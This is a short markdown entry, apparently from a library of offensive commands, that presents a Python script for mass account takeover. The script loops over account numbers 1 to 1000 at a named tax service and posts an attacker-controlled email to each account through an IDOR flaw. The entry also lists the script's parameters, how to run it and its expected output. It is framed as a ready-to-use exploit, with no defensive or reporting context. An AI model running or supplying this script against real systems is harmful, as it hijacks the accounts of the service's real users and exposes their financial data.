---
data: python script.py
tags:
  - automation
  - exploit
type: command
executor: python
platforms:
  - Linux
  - macOS
  - Windows
id: 25fe4f1f-794f-41b2-b88c-19ffd9db0318
created_at: '2025-12-11T03:47:49.035Z'
updated_at: '2025-12-11T03:47:49.035Z'
verified: false
validated: true
submitted: true
---
# python-automate-takeover

## Command

```python
import requests

attacker_email = 'attacker@example.com'
for account_num in range(1, 1001):
    url = f'https://app.taxjar.com/accounts/{account_num}'
    payload = {'email': attacker_email}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print(f'Successfully changed email for account {account_num}')
```

## Description

Python script to automate mass email changes via IDOR in TaxJar, looping through account numbers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `attacker_email` | Email to set for takeovers | Yes |
| `range(1, 1001)` | Range of account numbers to target | Yes |

## Examples

### Basic Usage

Save as script.py and run: python script.py

### Advanced Usage

Modify range and add error handling.

## Expected Output

Console logs of successful changes, e.g., 'Successfully changed email for account 123'.

## Related

- [[procedures/Automate-Mass-Account-Takeover-with-Python-Script]]
